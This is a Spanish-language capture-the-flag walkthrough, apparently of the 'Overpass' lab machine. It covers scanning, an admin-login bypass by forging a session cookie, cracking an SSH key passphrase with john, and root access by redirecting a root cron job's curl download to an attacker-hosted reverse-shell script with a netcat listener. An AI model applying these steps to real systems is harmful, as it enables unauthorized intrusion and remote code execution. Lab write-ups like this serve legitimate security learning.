
### nmap
```css
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 37:96:85:98:d1:00:9c:14:63:d9:b0:34:75:b1:f9:57 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDLYC7Hj7oNzKiSsLVMdxw3VZFyoPeS/qKWID8x9IWY71z3FfPijiU7h9IPC+9C+kkHPiled/u3cVUVHHe7NS68fdN1+LipJxVRJ4o3IgiT8mZ7RPar6wpKVey6kubr8JAvZWLxIH6JNB16t66gjUt3AHVf2kmjn0y8cljJuWRCJRo9xpOjGtUtNJqSjJ8T0vGIxWTV/sWwAOZ0/TYQAqiBESX+GrLkXokkcBXlxj0NV+r5t+Oeu/QdKxh3x99T9VYnbgNPJdHX4YxCvaEwNQBwy46515eBYCE05TKA2rQP8VTZjrZAXh7aE0aICEnp6pow6KQUAZr/6vJtfsX+Amn3
|   256 53:75:fa:c0:65:da:dd:b1:e8:dd:40:b8:f6:82:39:24 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMyyGnzRvzTYZnN1N4EflyLfWvtDU0MN/L+O4GvqKqkwShe5DFEWeIMuzxjhE0AW+LH4uJUVdoC0985Gy3z9zQU=
|   256 1c:4a:da:1f:36:54:6d:a6:c6:17:00:27:2e:67:75:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINwiYH+1GSirMK5KY0d3m7Zfgsr/ff1CP6p14fPa7JOR
80/tcp open  http    syn-ack ttl 63 Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 0D4315E5A0B066CEFD5B216C8362564B
|_http-title: Overpass
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### hacemos fuzzing con gobuster

![[2023-11-01_21-14.png]]

### encontramos varios directorios interesantes asi que aprobar.
directorios interesantes:
```css
	/aboutus
	/admin
	/downloads
```

### en el subdirectorio admin encontramos un pagina de login la cual no parece ser vulnerable a sqli 

![[2023-11-03_10-35.png]]

### vamos a mirar el codigo fuente en busca de mas informacion

![[2023-11-03_10-38.png]]

### vemos que la pagina esta haciendo un llamado a tres script diferentes, revisando en cada uno de ellos podemos encontrar que el script /login.js alberga una cookie de session

![[2023-11-03_10-43.png]]

### vamos a cambiar nuestra cookie por "SessionToken" para intentar acceder al login. esto lo haremos de la siguiente manera:

```c
	-click derecho
	 
	-inspeccionar
	 
	-storage
	
	-liego a +
	
	-editamos nuestro nombre de cookie por el que hemos conseguido
	
	-finalmente recargamos la pagina
```
![[2023-11-03_11-08.png]]

### hemos baypaseado el login con una cookie que hemos encontrado lo que nos permite ver una informacion valiosa.

![[2023-11-03_11-15.png]]

### ademas de una id_rsa encontramos un usuario llamado james. asi que podemos utilizar estas credenciales para  intentar acceder via SSH.

![[2023-11-03_11-25.png]]

### parece que necesitamos la contraseña para poder utilizar el id_rsa. asi que usaremos ssh2john de la siguiente manera.

```c
ssh2john id_rsa > id_rsa.hash
```

### ahora usaremos john para intentar conseguir el passdword
```c
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash 

james13          (id_rsa)     

1g 0:00:00:00 DONE (2023-11-03 11:35) 16.66g/s 223200p/s 223200c/s 223200C/s pink25..cheergirl
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### conseguimos james13 como passdword para el id_rsa asi que vamos a probar con esto.

![[2023-11-03_11-42.png]]

### conseguimos dos archivos. uno de ellos nos da informacion sobre un programa llamado overpass que alberga las contraseñas asi que vamos a buscar ese programa con el comando 
```c
	find / -name "overpass" 2>/dev/null
```

### parece que no conseguimos nada. vamos a buscar las tareas crontab

![[2023-11-03_13-11 1.png]]

### tenemos una tarea crontab que se ejecuta cada minuto de cada dia de cada mes como el usuario root. esto podemos notarlo con los * que responden a cada opcion

este crontab hace un llamado con el comando curl sobre overpass.thm/downloads/src/buildscript.sh vamos a aprovechar esto para editar el /etc/hosts y de esta manera hacer que el overpass.thm apunte a nuestra maquina atacante.
![[2023-11-03_13-19.png]]

### ok sabemos que la tarea crontab hace un curl sobre  overpass.thm/downloads/src/buildscript.sh hemos modificado el /etc/hosts para que apunte a nuestra maquina. ahora respetando la ruta exacta, tal cual se ejecuta en la tarea crontab nos montaremos un servidor en python para poder ejecutar esta tarea desde nuestra maquina atacante.

```c
	-creados una carpeta llamada 'downloads' dentro de esta carpeta creamos otra llamada 'src'
	y finalmente creamos un archivo llamado "buildscript.sh" 
	este archivo va a contener nuestra reverse shell
```

![[2023-11-03_13-26.png]]
en  este caso usaremos la shell mas basica de todas en bash. 

### es importante saber que el curl hace el llamado a  overpass.thm/downloads/src/buildscript.sh en ese orden. por lo que debemos estar por detras de la carpeta  "downloads'' para que se ejecute correctamente.

ahora montamos un servidor en python de la siguiente manera:
```c 
	python3 -m http.server 80
```
esperamos un minuto mas o menos para que la tarea crontab se ejecute de nuevo
![[2023-11-03_13-33.png]]
por otro lado estaremos escuchando con netcat
```c 
	nc -lvnp 444
```

![[2023-11-03_13-37.png]]
### WE ARE ROOT
